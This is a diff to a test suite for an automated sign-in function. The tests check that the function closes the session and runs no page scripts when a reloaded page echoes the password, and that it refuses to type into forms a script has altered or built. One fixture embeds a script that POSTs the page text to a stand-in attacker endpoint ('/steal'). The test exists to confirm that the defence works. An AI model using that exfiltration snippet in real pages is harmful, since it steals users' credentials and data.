@@ -349,8 +349,8 @@ describe(signIn, () => {
         const result = await run();
 
         expect(result).toMatchObject({ submitted: true, success: true });
-        // The answer, then the cleanup's reload, whose script runs once the lock is lifted.
-        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home", "/home", "/ran"]);
+        // The answer and the cleanup's look at it, both without scripts, then the load the session goes on with.
+        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home", "/home", "/home", "/ran"]);
     });
 
     it("sends the password in a multipart form's own POST", async () => {
@@ -569,7 +569,7 @@ describe(signIn, () => {
         expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
     });
 
-    it("closes the session when the reloaded page shows the password as text", async () => {
+    it("closes the session, and runs none of its script, when the reloaded page shows the password as text", async () => {
         let echoed = "";
 
         fixture.page = loginForm();
@@ -579,7 +579,11 @@ describe(signIn, () => {
             response.end();
         };
         // The site renders what it was sent, as a page could from its own records.
-        Object.defineProperty(fixture, "home", { configurable: true, get: () => `<p>Signed in with ${echoed}</p>` });
+        Object.defineProperty(fixture, "home", {
+            configurable: true,
+            get: () =>
+                `<p>Signed in with ${echoed}</p><script>fetch("${evil.origin}/steal", { body: document.body.textContent, method: "POST", mode: "no-cors" });</script>`,
+        });
 
         const result = await run();
 
@@ -587,6 +591,27 @@ describe(signIn, () => {
 
         expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
         expect(page.isClosed()).toBe(true);
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it.each([
+        ["points the form at another address of the site", `document.forms[0].action = "/profile";`],
+        ["renames the password field", `document.forms[0].pw.name = "bio";`],
+    ])("types nothing when a script of the page %s before it is filled", async (_what, script) => {
+        fixture.page = loginForm(script);
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("A script changed where"), submitted: false, success: false });
+        expect(await page.inputValue("[name=user]")).toBe("");
+    });
+
+    it("types nothing into a login form a script builds", async () => {
+        fixture.page = `<div id="app"></div><script>document.querySelector("#app").innerHTML = ${JSON.stringify(loginForm()).replaceAll("</", String.raw`<\/`)};</script>`;
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("built by a script"), submitted: false, success: false });
     });
 
     it("does not count a beacon of the whole form as the sign-in", async () => {
